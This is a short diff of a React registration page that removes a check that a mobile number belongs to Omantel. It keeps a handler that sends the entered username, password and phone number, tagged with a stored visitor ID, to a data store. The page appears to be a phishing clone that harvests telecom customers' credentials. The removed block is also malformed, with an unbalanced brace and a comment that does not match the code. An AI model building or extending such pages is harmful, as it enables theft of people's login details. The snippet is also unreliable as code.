@@ -30,22 +30,10 @@ export default function RegisterPage() {
   }, [])
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (mobile.length > 7) {
-      const m1 = mobile.substring(0, 2)
-  // Fixed: Changed || to && (must fail ALL conditions to be invalid)
-  if (!['71', '72', '90', '91', '92', '93'].includes(m1)) {
-    setIsOmnTel(false)
-    alert('الرقم المدخل غير تابع لعمان تل')
-    return
-  }                   // Or better yet, use includes() for cleaner code:
-                         
-
-
     const visitorId = localStorage.getItem("visitor") as string
     addData({ id: visitorId!, userName: userId, password, mobile, email: mobile }).then(() => {
       console.log("done1")
       setCurrentStep("2")
-
     })
     setIsLoading(true)
 
